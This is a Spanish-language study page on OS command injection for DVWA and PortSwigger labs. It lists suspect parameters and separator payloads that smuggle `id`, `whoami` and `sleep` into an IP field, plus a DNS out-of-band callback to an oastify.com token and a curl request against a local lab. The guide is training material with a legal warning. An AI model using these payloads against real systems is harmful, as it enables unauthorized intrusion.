<div align="center">

# 💻 Command Injection
### Inyección de Comandos del Sistema Operativo

![Status](https://img.shields.io/badge/Status-Active-ff3c6e?style=for-the-badge&logo=statuspage&logoColor=white)
![Category](https://img.shields.io/badge/Category-Command%20Injection-00d4ff?style=for-the-badge&logo=owasp&logoColor=white)
![Tool](https://img.shields.io/badge/Main%20Tool-Caido-00ff88?style=for-the-badge)

</div>

---

> **Command Injection:** inyección de comandos del sistema operativo a través de parámetros no sanitizados que se pasan a funciones de ejecución del servidor.

> [!WARNING]
> **Aviso Legal y Ético:** Uso exclusivo en entornos con **autorización explícita por escrito (RoE).** El uso no autorizado constituye un delito penal.

---

## 📑 Tabla de Contenidos

| # | Sección |
|---|---------|
| 01 | [🎯 Labs Objetivo](#-labs-objetivo) |
| 02 | [🛠️ Herramientas](#️-herramientas) |
| 03 | [🔍 Entradas Típicas](#-entradas-típicas) |
| 04 | [🧪 Payloads Base](#-payloads-base) |
| 05 | [🔁 Flujo con Caido](#-flujo-con-caido) |
| 06 | [⚙️ Comandos Útiles](#️-comandos-útiles) |
| 07 | [🧠 Señales](#-señales) |
| 08 | [🧭 Ruta de Práctica](#-ruta-de-práctica) |
| 09 | [📝 Checklist](#-checklist) |

---

## 🎯 Labs Objetivo

| Plataforma | Labs recomendados |
|-----------|-------------------|
| **DVWA** | Command Injection |
| **PortSwigger** | OS command injection |

---

## 🛠️ Herramientas

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-interactsh-a855f7?style=flat-square)
![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

| Herramienta | Uso |
|-------------|-----|
| **Caido** | `Replay` — modificar parámetros de input |
| **interactsh-client** | OAST — callbacks OOB para blind injection |
| **curl** | Reproducción rápida fuera de proxy |

---

## 🔍 Entradas Típicas

![Context](https://img.shields.io/badge/Detección-Parámetros-ff6b00?style=flat-square)

Parámetros que sugieren operación del sistema:

- `ip=`, `host=`, `domain=`
- `ping=`, `nslookup=`
- `filename=`, `cmd=`

> [!TIP]
> Funcionalidades de diagnóstico de red (ping, traceroute, nslookup) son los candidatos más comunes para command injection directa.

---

## 🧪 Payloads Base

### `[01]` Linux — separadores

```text
127.0.0.1;id
127.0.0.1&&id
127.0.0.1|id
127.0.0.1`id`
127.0.0.1$(id)
```

### `[02]` Windows — separadores

```text
127.0.0.1 & whoami
127.0.0.1 && whoami
127.0.0.1 | whoami
```

### `[03]` Blind — delay

```text
127.0.0.1;sleep 5
127.0.0.1&&timeout 5
```

> [!NOTE]
> Si no hay output visible, confirmar con delay antes de intentar OOB. Un retraso reproducible de 5s ya es evidencia de blind command injection.

---

## 🔁 Flujo con Caido

![Tool](https://img.shields.io/badge/Tool-Caido-00ff88?style=flat-square)

### `[01]` Capturar request funcional

Localizar acción que ejecuta comando server-side.

### `[02]` Replay con separador

Cambiar input a:

```text
127.0.0.1;id
```

### `[03]` Evaluar respuesta

Buscar:

- output de `uid=` / `whoami` → injection directa
- retraso reproducible → blind injection
- error de shell inesperado → vector confirmado

### `[04]` Escalar si blind

Si no hay output:

1. Probar delay: `127.0.0.1;sleep 5`
2. Probar OAST: `127.0.0.1;nslookup <token>.oastify.com`

> [!IMPORTANT]
> Probar separadores Linux primero, luego Windows. La shell del servidor determina qué separadores funcionan.

---

## ⚙️ Comandos Útiles

![Tool](https://img.shields.io/badge/Tool-curl-00d4ff?style=flat-square)

```bash
curl -i "http://dvwa.local/vulnerabilities/exec/?ip=127.0.0.1;id&Submit=Submit#"
```

---

## 🧠 Señales

| Señal | Lectura |
|-------|---------|
| Output de `uid=` / `whoami` | command injection directa confirmada |
| Retraso reproducible exacto | blind command injection |
| Callback DNS/HTTP en interactsh | OOB — injection ciega confirmada |
| Error de shell inusual | separador incorrecto, probar variante |

---

## 🧭 Ruta de Práctica

1. DVWA Command Injection
2. PortSwigger: useful commands (output directo)
3. PortSwigger: blind via time delay
4. PortSwigger: blind via OAST

---

## 📝 Checklist

- [ ] separador válido detectado
- [ ] shell target inferida (Linux / Windows)
- [ ] output directo o señal lateral confirmada
- [ ] payload mínimo reproducible documentado
